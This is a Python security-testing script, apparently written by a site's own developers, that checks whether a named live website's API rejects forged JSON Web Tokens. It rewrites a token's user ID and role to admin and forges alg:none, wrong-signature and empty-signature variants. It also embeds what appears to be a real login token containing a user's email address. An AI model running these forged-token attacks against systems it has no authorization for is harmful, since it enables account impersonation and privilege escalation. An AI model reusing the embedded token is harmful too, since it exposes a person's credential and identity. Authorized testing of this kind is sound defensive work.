#!/usr/bin/env python3
"""
DAST Script 2: JWT Tampering & Impersonation Attack
════════════════════════════════════════════════════
Target : GET /api/auth/me  +  POST /api/posts
Attack : Decode a valid JWT, change userId → admin ID,
         re-encode with alg:none and wrong signature
Goal   : Verify backend rejects tampered/unsigned tokens

Expected result if SECURE:
  - All tampered tokens → 401 "Token hết hạn hoặc không hợp lệ"
  - Only original valid token → 200

Expected result if VULNERABLE:
  - Tampered token with changed userId returns someone else's data
"""

import requests
import base64
import json
import hmac
import hashlib
import time
import sys

# ─── Configuration ──────────────────────────────────────────────────────────
TARGET = "https://livelinepcbn.com"

# ⚠️ PASTE A VALID JWT HERE — login first, grab it from browser DevTools
# Network tab → any API request → Authorization: Bearer <token>
VALID_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI5NmMxOGQ2Mi01ZmQ0LTRmMDYtOGYwMy05NjQ3ZTA0MTk0NzYiLCJlbWFpbCI6ImR1bmdkb25nMzMzQGdtYWlsLmNvbSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzc2MzA1OTA2LCJleHAiOjE3NzY5MTA3MDZ9.11Kqob-SnuxmryCEVF-Pa09GaO844C_9P6qTNzXyOlw"

ADMIN_USER_ID = "1"  # The admin ID from seed data


# ─── JWT manipulation helpers ───────────────────────────────────────────────
def b64url_decode(s):
    """Base64url decode (add padding if needed)."""
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(data):
    """Base64url encode (strip padding)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token):
    """Split a JWT and decode header + payload (no verification)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]


def forge_alg_none(payload_dict):
    """Create a JWT with alg:none — classic JWT bypass attack."""
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload_dict).encode())
    return f"{h}.{p}."


def forge_wrong_signature(header_dict, payload_dict):
    """Create a JWT with correct structure but wrong HMAC signature."""
    h = b64url_encode(json.dumps(header_dict).encode())
    p = b64url_encode(json.dumps(payload_dict).encode())
    # Sign with a known-wrong key
    fake_sig = b64url_encode(
        hmac.new(b"attacker_secret_key", f"{h}.{p}".encode(), hashlib.sha256).digest()
    )
    return f"{h}.{p}.{fake_sig}"


def forge_empty_signature(header_dict, payload_dict):
    """Create a JWT with empty signature field."""
    h = b64url_encode(json.dumps(header_dict).encode())
    p = b64url_encode(json.dumps(payload_dict).encode())
    return f"{h}.{p}."


def test_token(label, token, endpoint="/api/auth/me"):
    """Send a request with the given token and report result."""
    url = f"{TARGET}{endpoint}"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        status = r.status_code
        body = r.text[:200]

        if status == 401:
            verdict = "🛡️ REJECTED"
        elif status == 200:
            data = r.json()
            returned_id = data.get("id", "?")
            verdict = f"⚠️ ACCEPTED (returned userId={returned_id})"
        else:
            verdict = f"HTTP {status}"

        print(f"  [{label:40s}] {verdict}")
        return status, body
    except Exception as e:
        print(f"  [{label:40s}] ❌ ERROR: {e}")
        return 0, str(e)


# ─── Main Attack ────────────────────────────────────────────────────────────
print(f"""
╔══════════════════════════════════════════════════════════╗
║  DAST #2 — JWT Tampering & Impersonation Attack          ║
║  Target : {TARGET + '/api/auth/me':<46} ║
╚══════════════════════════════════════════════════════════╝
""")

if VALID_JWT == "PASTE_YOUR_VALID_JWT_HERE":
    print("  ⚠️  You must paste a valid JWT in VALID_JWT variable!")
    print("  How: Login in browser → DevTools → Network → copy Authorization header")
    sys.exit(1)

# Decode the original token
try:
    orig_header, orig_payload, orig_sig = decode_jwt(VALID_JWT)
    print(f"  Original JWT payload: {json.dumps(orig_payload, indent=2)}")
    print()
except Exception as e:
    print(f"  ❌ Failed to decode JWT: {e}")
    sys.exit(1)

# ── Test 1: Original valid token (baseline) ──
print("─── Phase 1: Baseline (original valid token) ───")
test_token("Original valid token", VALID_JWT)
print()

# ── Test 2: Tampered userId with alg:none ──
print("─── Phase 2: alg:none attack (userId → admin) ───")
tampered_payload = {**orig_payload, "userId": ADMIN_USER_ID, "role": "admin"}
alg_none_token = forge_alg_none(tampered_payload)
test_token("alg:none + userId=admin", alg_none_token)
print()

# ── Test 3: Tampered userId with wrong signature ──
print("─── Phase 3: Wrong signature attack ───")
wrong_sig_token = forge_wrong_signature(orig_header, tampered_payload)
test_token("Wrong HMAC + userId=admin", wrong_sig_token)
print()

# ── Test 4: Original header/payload, empty signature ──
print("─── Phase 4: Empty signature attack ───")
empty_sig_token = forge_empty_signature(orig_header, tampered_payload)
test_token("Empty sig + userId=admin", empty_sig_token)
print()

# ── Test 5: Completely garbage token ──
print("─── Phase 5: Garbage tokens ───")
test_token("Random string", "this.is.not.a.jwt")
test_token("Empty string", "")
test_token("Base64 gibberish", b64url_encode(b"garbage") + "." + b64url_encode(b"data") + ".fakesig")
print()

# ── Test 6: Expired token simulation (modify exp) ──
print("─── Phase 6: Expired token attack ───")
expired_payload = {**orig_payload, "exp": int(time.time()) - 3600}  # 1 hour ago
expired_token = forge_wrong_signature(orig_header, expired_payload)
test_token("Expired token (1hr ago)", expired_token)
print()

# ── Verdict ──
print("═══════════════════════ VERDICT ═══════════════════════")
print("  If ALL tampered tokens show 🛡️ REJECTED → ✅ SECURE")
print("  If ANY tampered token shows ⚠️ ACCEPTED  → 🔴 VULNERABLE")
